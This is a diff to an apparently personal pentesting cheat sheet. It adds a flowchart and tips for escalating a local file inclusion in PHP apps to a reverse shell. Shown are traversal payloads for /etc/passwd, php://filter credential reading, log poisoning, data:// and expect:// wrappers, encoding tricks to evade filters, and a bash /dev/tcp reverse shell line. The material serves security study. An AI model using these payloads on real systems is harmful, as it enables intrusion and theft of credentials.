@@ -46,6 +46,40 @@ Parameter includes a file? (page=, file=, template=, lang= etc)
     └── ?page=...&cmd=bash -c 'bash -i >%26 /dev/tcp/<LHOST>/4444 0>%261'
 ```
 
+## Visual Flow — LFI to Shell
+
+```mermaid
+flowchart TD
+    A[Param: page=, file=, lang=] --> B[Test: ?page=../../../../etc/passwd]
+    B --> C{See /etc/passwd?}
+    C -->|No| D[Add more ../ or URL-encode dots %2e<br/>see Encoding Reference]
+    C -->|Yes| E[✅ LFI confirmed]
+    E --> F{Read source?}
+    F -->|Yes| G["php://filter base64<br/>read config for creds/DB"]
+    E --> H{Get RCE?}
+    H -->|Log poisoning| I["Inject PHP into User-Agent<br/>then include access.log"]
+    H -->|Wrappers| J["data:// or expect://"]
+    I --> K[?page=...access.log&cmd=id]
+    J --> K
+    K --> L[🐚 Reverse shell]
+```
+
+> [!success] What success looks like
+> Requesting `?page=../../../../etc/passwd` returns lines like `root:x:0:0:root:/root:/bin/bash`. That's confirmed LFI — now escalate to source-read or RCE.
+
+> [!warning] If `/etc/passwd` doesn't show
+> - Add more `../` (you may not be deep enough).
+> - **URL-encode the dots:** `%2e%2e%2f` — filters often block literal `../`. See [[🔣 Encoding Reference]].
+> - Try a null byte `%00` on old PHP (<5.3.4) if the app appends `.php`.
+
+> [!danger] Common errors
+> - Page returns blank / "failed to open stream" → wrong path or file doesn't exist; adjust depth.
+> - PHP wrapper `data://` fails → needs `allow_url_include=On` (often off). Use log poisoning instead.
+> - Reverse shell in `cmd=` won't fire → URL-encode `&` as `%26` and spaces; test `cmd=id` first.
+
+> [!tip] Beginner note — LFI vs Directory Traversal
+> **Traversal** = *read* a file's contents. **LFI** = the file gets *executed/included* by the app. LFI is more powerful because it can lead to code execution. See [[Identifying and exploiting directory traversals]].
+
 ## Common Log Paths
 | OS | Log |
 |----|-----|
